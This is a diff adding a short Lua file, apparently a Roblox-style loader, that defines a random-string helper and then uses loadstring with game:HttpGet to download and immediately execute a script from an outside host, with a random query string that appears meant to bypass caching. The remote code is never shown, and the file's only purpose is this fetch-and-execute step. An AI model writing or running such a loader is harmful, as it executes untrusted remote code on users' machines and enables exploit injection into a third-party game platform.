@@ -1,0 +1,10 @@
+local chars = "abcdefghijklmnopqrstuvwxyz0123456789"
+function randomString(length)
+    local result = ""
+    for i = 1, length do
+        local rand = math.random(1, #chars)
+        result = result .. chars:sub(rand, rand)
+    end
+    return result
+end
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/6504cdd358593b8fc8ec638f0f9aee674ae262b109595c5236520f3f3e6dd923/download?"..randomString(16)))()
